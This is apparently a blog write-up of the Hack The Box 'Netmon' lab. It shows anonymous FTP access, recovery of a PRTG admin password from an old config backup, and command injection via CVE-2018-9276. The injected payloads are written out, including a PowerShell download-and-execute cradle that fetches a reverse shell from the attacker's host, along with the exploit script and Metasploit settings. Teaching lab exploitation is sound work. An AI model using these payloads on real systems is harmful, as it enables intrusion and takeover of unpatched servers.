---
title:     "Hack The Box - Netmon"
tags: [HackTheBox,Windows,Easy,CVE]
layout: post
categories: HackTheBox-Writeups
---
![](/images/HTB/Netmon/netmon.jpeg)

# Introduction
Netmon is an easy Windows machine with quite possibly the easiest user flag in existence. It features a real world look at password reuse and a command injection vulnerability to get Administrator access. Let's get to it!

# Initial Enumeration
## Nmap
```
Nmap 7.91 scan initiated Mon Apr  5 18:08:13 2021 as: nmap -T3 -Pn -O -p T:21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 -sV --script=default,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-vuln-cve2010-0738.nse,http-vuln-cve2011-3192.nse,http-vuln-cve2014-2126.nse,http-vuln-cve2014-2127.nse,http-vuln-cve2014-2128.nse,http-vuln-cve2014-2129.nse,http-vuln-cve2015-1635.nse,http-vuln-cve2017-1001000.nse,ssl-cert-intaddr.nse,ssl-dh-params.nse,ssl-heartbleed.nse,msrpc-enum.nse,smb-enum-shares.nse,smb-vuln-ms17-010.nse,smb-enum-users.nse,smb-double-pulsar-backdoor.nse,smb2-vuln-uptime.nse -oN /storage/HackTheBox/Netmon/nmap2/vuln_10.10.10.152.nmap 10.10.10.152
Nmap scan report for 10.10.10.152
Host is up (0.0081s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
| http-vuln-cve2010-0738: 
|_  /jmx-console/: Authentication was not required
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 4m36s, deviation: 0s, median: 4m36s
|_msrpc-enum: No accounts left to try
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-05T22:13:55
|_  start_date: 2021-04-05T22:10:17

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  5 18:09:26 2021 -- 1 IP address (1 host up) scanned in 73.53 seconds

```

## FTP & the user flag
Our Nmap scan shows that the server has anonymous FTP access and it looks like the entire "C:\" is accessible. If that is the case all we would need to do is log in to grab the user flag. Let's give it a try.

![](/images/HTB/Netmon/user_flag_ftp.png)

Now that we have downloaded the flag lets take a look.

![](/images/HTB/Netmon/user_flag_local.png)

Yup, looks like a flag. Let's continue enumerating the box for the time being.

## SMB
We can try to connect and list shares with `smbclient -L \\\\10.10.10.152` but we only get login failures. This is not very useful at the moment.

## HTTP
Taking a look at the website we see the machine is running PRTG Network Monitor and we are greeted with a login page. At the very least we could try to see if there is a default login and password and see if we can login. A quick Google search shows us that the default credentials are prtgadmin/prtgadmin.

![](/images/HTB/Netmon/default_creds.png)

We can try to log in with these credentials but we don't get anywhere. My next thought was that since we have access to the entire "C:\", does PRTG store the credentials somewhere we can access them. Asking our friend Google where PRTG stores the passwords brings up a nice KB article with the answer.

![](/images/HTB/Netmon/prtg_password_location.png)

So we have a file but the passwords are encrypted. Let's ask Google if we can decrypt these passwords by searching `PRTG decrypt passwords`. We don't find an answer about decrypting these passwords, however we do find a Reddit post talking about exposed credentials. The post links to a notice from Paessler explaining that the credentials were stored in plain text in the configuration file and that this effects versions `17.4.35 (17.4.35.3326) through 18.1.37`. Didn't we have a version number from our Nmap scan? Look at that, port 80 shows `http-server-header: PRTG/18.1.37.13946`. I think we are on the right track.

## Returning to FTP

From the post made by Paessler we know that we are looking for the directory `C:\ProgramData\Paessler\PRTG Network Monitor\` which should contain some configuration files. Let's have a look:

![](/images/HTB/Netmon/ftp_configuration_files.png)

It looks like there are three different configuration files, .dat, .old, and old.bak. Let's grab all of them with `get` and see what we can find. Now if you recall from our initial research we saw that the default username was `prtgadmin`, so instead of digging through these files manually let's see if that name exists anywhere in these files with grep.

![](/images/HTB/Netmon/config_search.png)

Bingo. Let's use grep to show us five lines before and after where it finds 'prtgadmin'

![](/images/HTB/Netmon/config_grep.png)

And there we have it. It looks like the password is `PrTg@dmin2018`. Now we can login to the site! Enter the credentials and... oh. It doesn't work. Now this machine was released on HackTheBox in 2019, and if we review the dates of the files in the FTP server we see that the .old.bak file is from 2018. We can verify that this username and password are actually in this old.bak file. So since the current year (of the box at least) is 2019, and the file that the password came from is an old backup lets change the password to `PrTg@dmin2019` and try again. And we're in.


# Getting root

Since we are doing this box in the future there are a few ways to get root although they all use the same vulnerability. We'll start by doing the exploit manually, then show off a nice bash script that does the work for us, and finally we'll use metasploit for simple pwnage.

## Manual method

When the box came out there was only a CVE for command injection, CVE-2018-9276. There is a nice blog post on codewatch.org explaining the process. Basically PRTG can set up notifications for when a sensor detects a problem and the notification can execute a custom program when it happens. PRTG has two sample programs built in, one being a .bat and one being a .ps1. The BAT file echo's the date and time into a file, the filename being the parameter you give the program. The PS1 file does the same thing however according to the blog post the PS1 file does not encode characters that we pass as the parameter where the BAT file does. So with the PS1 file we can give it a filename, followed by a semicolon, and have it run whatever commands we give it.

### Testing command execution

To start we must navigate to Setup > Account Settings > Notifications. On this page we see a '+' icon that we can click on to add a notification. On this next page we can give our new notification a name if we wish, then we can scroll down and look for the 'execute program' toggle. Once we toggle this we must specify a program file. As noted above we are looking for the demo PS1 file. Now we must edit the parameters and give a filename and a command we would like to execute. When testing command execution I like to try to ping myself. We can see if the ping is successful by monitoring with tcpdump for ICMP traffic. So for this test let's specify `test.txt;ping 10.10.14.9` as the parameters. Since this is a Windows machine it will only ping four times so we don't need to specify the number of pings.

Once we save the new notification we can test it by clicking on it in the next screen and hitting the 'send test notification' option. First we must get tcpdump ready for listening with the following command:

`tcpdump -i tun0 icmp`

That will monitor our tun0 interface and show only ICMP traffic. Time to test our notification.

![](/images/HTB/Netmon/ping_success.png)

Success!

#### Actually getting root

Now that we have command execution, let's see if we can get a reverse shell. We are going to use Nishang's `Invoke-PowerShellTcpOneLine.ps1` (which can be found on github) to get our shell. Edit the file and delete all of the lines except the one starting with `$client` and add the proper IP address and port number. I also like to rename the file to rs.ps1 to make it a bit easier to type. Then setup a webserver and start our listener:

```
python3 -m http.server
nc -lvnp 6868
```

Now we must modify our notification in PRTG to have Netmon download and execute our reverse shell. We can do that by changing the notification to `test.txt;IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.9:8000/rs.ps1')`. Hit test notification and...

![](/images/HTB/Netmon/manual_root.png)

We now have a root shell. Boom.

## Bash Script

Right after this box was released a bash script appeared on exploit-db for PRTG authenticated remote code execution. Looking at this code the script does three things:
- Creates the text file C:\Users\Public\tester.txt
- Creates a user pentest with the password P3nT3st!
- Adds the pentest user to the administrators group

You'll note that if you read the blog post mentioned in the manual method that the username and password are the same that were used in that example. The big difference here is that this script adds them to the administrators group where as in the article he just created the user. If you were trying to follow the article and ended up with an 'authorization denied' error when connecting to the SMB share this is why.

So we know this script should work because our version falls within the version in the CVE so let's give it a shot. Since HackTheBox may have different users trying to exploit the same box, at the very least I like to change the username found in the scripts I find. A quick find/replace of 'pentest' to 'cypher' should do the trick.

The one other thing this script requires is the login cookie so it can authenticate with the server. Let's load up burp and send a login request:

![](/images/HTB/Netmon/burp_request.png)

Here we see our cookie as the site attempts to load /home. Let's copy that and we should be ready to run the program.

`./rce.sh -u http://10.10.10.152 -c "OCTOPUS1813713946=e0YwNUE4QzdDLUM2NkMtNDcxMS05NTU3LTE2ODM1Q0I0NzExOX0%3D"`

![](/images/HTB/Netmon/rce_script.png)

Success! Now we have some options. We could just use smbclient to grab the root flag:

`\\\\10.10.10.152\\C$ -U cypher`

![](/images/HTB/Netmon/smbclient.png)


Or what if we wanted a full shell? We could use psexec from impacket to do that. Note that we need to escape the '!' when we log in.

![](/images/HTB/Netmon/psexec.png)

Boom.

## Metasploit

There is now a metasploit module to make matters even easier.

![](/images/HTB/Netmon/metasploit_search.png)

All we need to do is set our lhost (which tends to come up with the wrong interface), admin_password, and rhosts. 

```
set lhost tun0
set admin_password PrTg@dmin2019
set rhosts 10.10.10.152
```
Type run (or exploit) and we are done.

![](/images/HTB/Netmon/metasploit_owned.png)

Boom. 

# References 

- [Where are stored passwords saved? \| Paessler Knowledge Base](https://kb.paessler.com/en/topic/62202-where-are-stored-passwords-saved)
- [PRTG exposes Domain accounts and passwords in plain text. : sysadmin](https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/)
- [PRTG < 18.2.39 Command Injection Vulnerability \| CodeWatch: Application Security Blog](https://www.codewatch.org/blog/?p=453)
- [PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution - Windows webapps Exploit](https://www.exploit-db.com/exploits/46527)